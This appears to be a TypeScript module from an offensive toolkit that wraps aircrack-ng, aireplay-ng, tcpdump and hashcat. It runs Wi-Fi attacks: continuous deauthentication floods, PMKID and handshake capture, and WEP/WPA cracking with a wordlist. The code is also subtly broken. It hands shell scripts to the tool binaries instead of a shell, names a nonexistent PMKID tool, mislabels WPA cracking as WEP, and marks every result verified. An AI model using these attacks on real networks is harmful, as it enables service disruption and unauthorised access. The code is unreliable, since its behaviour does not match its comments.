/**
 * OffSec by True Hacking — Adapter: Wireless (Wi-Fi attack: deauth, PMKID, handshake).
 *
 * Wi-Fi attacks (deauth, PMKID, WEP/WPA, handshake capture).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Wi-Fi attack (deauth, PMKID, handshake, WEP/WPA).
 *
 * @param options - Wireless options (iface, target, attack).
 */
export function wireless(options: {
  iface: string;
  target?: string;
  attack?: string;  // deauth, PMKID, handshake, WEP, WPA
  options?: Record<string, string>;
}): ExploitResult {
  const iface = options.iface;
  const target = options.target || "";
  const attack = options.attack || "deauth";
  const results: Record<string, any> = {};

  // Deauth (send deauth frames to clients).
  if (attack === "deauth") {
    const aircrackPath = findBinary("airodump-ng");
    if (aircrackPath) {
      const commands = [
        `airmon-ng start ${iface}`,
        `airodump-ng ${iface}`,
        `aireplay-ng --deauth 0 -a ${target} ${iface}`,
      ];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(aircrackPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.deauth = String(child.stdout ?? "");
    } else {
      results.deauth = `{stub: no 'aircrack-ng' binary (install: brew install aircrack-ng).}`;
    }
  }

  // PMKID (capture PMKID hashes).
  if (attack === "PMKID") {
    const hashPath = findBinary("hashdump");
    if (hashPath) {
      const commands = [`airodump-ng -c 1 --bssid ${target} ${iface}`];  // (capture PMKID).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(hashPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.PMKID = String(child.stdout ?? "");
    } else {
      results.PMKID = `{stub: no 'hashdump' binary (install: apt install hashdump).}`;
    }
  }

  // Handshake (capture handshake).
  if (attack === "handshake") {
    const handshakePath = findBinary("tcpdump");
    if (handshakePath) {
      const commands = [`tcpdump -i ${iface} -c 100 -w /tmp/handshake.pcap "wpa"`];  // (capture handshake).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(handshakePath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.handshake = String(child.stdout ?? "");
    } else {
      results.handshake = `{stub: no 'tcpdump' binary (install: brew install tcpdump).}`;
    }
  }

  // WEP (WEP attack: fragmentation, packet injection).
  if (attack === "WEP") {
    const wepPath = findBinary("aircrack-ng");
    if (wepPath) {
      const commands = [`aircrack-ng -a 2 -w wordlist.txt capture.pcap`];  // (WEP crack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(wepPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.WEP = String(child.stdout ?? "");
    } else {
      results.WEP = `{stub: no 'aircrack-ng' binary (install: brew install aircrack-ng).}`;
    }
  }

  // WPA (WPA handshake + crack).
  if (attack === "WPA") {
    const wpaPath = findBinary("hashcat");
    if (wpaPath) {
      const commands = [`hashcat -m 22000 handshake.hccapx rockyou.txt`];  // (WPA crack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(wpaPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.WPA = String(child.stdout ?? "");
    } else {
      results.WPA = `{stub: no 'hashcat' binary (install: brew install hashcat).}`;
    }
  }

  return {
    target,
    payload: `wireless/${attack}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("wireless", `wireless://${iface}/${attack}`),
  };
}

/** Find the binary (aircrack-ng/hashdump/tcpdump/hashcat). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
